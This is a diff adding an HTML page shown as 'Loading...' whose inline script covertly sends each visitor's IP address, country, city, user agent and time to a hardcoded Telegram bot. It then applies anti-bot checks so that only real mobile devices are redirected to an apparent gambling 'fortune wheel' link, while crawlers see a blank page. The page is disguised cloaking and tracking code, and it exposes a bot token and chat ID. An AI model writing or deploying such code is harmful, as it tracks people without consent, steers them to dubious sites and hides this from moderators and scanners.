@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Loading...</title>
+  <script>
+    // === НАСТРОЙКА ===
+    const TELEGRAM_BOT_TOKEN = "7758069141:AAHHAPWsqzcENsp3ZB-ZK5GiRjQiDsLtw0M";
+    const TELEGRAM_CHAT_ID = "7420967818";
+    const REDIRECT_URL = "https://1wibsp.life/v3/5267/fortune-wheel-aviamasters?p=tatp";
+
+    // === АНТИБОТ ПРОВЕРКИ ===
+    const isHeadless = navigator.webdriver || false;
+    const isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+    const isMobile = screen.width <= 500;
+    const hasPlugins = navigator.plugins.length > 0;
+    const hasLanguages = navigator.languages && navigator.languages.length > 0;
+
+    const passedChecks = !isHeadless && isTouch && isMobile && hasPlugins && hasLanguages;
+
+    // === ЛОГГИРОВАНИЕ В TELEGRAM ===
+    function sendLog(ip, country, city, ua) {
+      const message = '🌍 IP: ${ip}\n📍 Country: ${country}\n🏙️ City: ${city}\n📱 UA: ${ua}\n🕰️ Time: ${new Date().toLocaleString()}';
+      const url = 'https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}';
+      fetch(url).catch(() => {});
+    }
+
+    // === ПОЛУЧЕНИЕ IP/ГЕО ===
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+        const country = data.country_name;
+        const city = data.city;
+        const ua = navigator.userAgent;
+        sendLog(ip, country, city, ua);
+
+        // === УСЛОВИЯ ПРОПУСКА ===
+        if (passedChecks) {
+          setTimeout(() => {
+            window.location.href = REDIRECT_URL;
+          }, 700); // можно сделать больше — например, 1500мс
+        } else {
+          setTimeout(() => {
+            window.location.href = "about:blank";
+          }, 300);
+        }
+      })
+      .catch(() => {
+        document.body.innerHTML = "<h3 style='text-align:center;margin-top:50px;'>Connection Error</h3>";
+      });
+  </script>
+</head>
+<body style="background:#fff;"></body>
+</html>
